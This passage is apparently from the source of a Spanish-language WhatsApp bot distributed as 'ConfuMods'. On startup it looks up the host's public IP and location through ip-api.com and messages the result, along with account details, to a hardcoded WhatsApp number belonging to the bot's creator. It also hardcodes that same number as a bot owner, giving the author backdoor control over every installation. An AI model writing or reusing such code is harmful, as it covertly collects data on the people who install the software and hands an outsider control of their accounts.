...
cnf.autoReconnect = ReconnectMode.onConnectionLost
 ...
 console.log(color('|WRN|', 'yellow'), color('Úniendose al grupo oficial de ConfuMods', 'cyan'))
 cnf.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hola creador soy ${settings.NamaBot}, Me eh conectado a este número con éxito*\n────────────────────\n\`\`\`${JSON.stringify(cnf.user, null, 2)}\`\`\`\n────────────────────\n*Si hay un error o el bot no responde reportarlo a ConfuMods*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "ConfuMods",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:"https://wa.me/56922426846?text=ola%20confu%20Te%20Amo😍❤️"}}})
	console.log(color('|WRN|', 'yellow'), color('Enviando de información de usuario a ConfuMods', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       cnf.sendMessage("56922426846@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Creador ConfuMods",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:"https://wa.me/56922426846?text=Ola"}}})
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   cnf.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["56922426846@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "56922426846@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
		...
		if (!welkom.includes(anu.jid)) return
           mem = anu.participants[0]
			...
			console.log(anu)
			if (anu.action == 'add') {			
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;cnf;;;\nFN:cnf\nitem1.TEL;waid=56922426846:56922426846\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
...
cnf.on('CB:action,,call', async json => {
        ...
        cnf.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Creador ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:`https://wa.me/56922426846?text=ola%20confu%20Te%20Amo❤️😍`}}})
        await sleep(5000)
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Usas los bots de Confu? que esperas movete y subscríbete a su canal ctm', 'red'))})}, 200 ) ;
	}
	else
	{
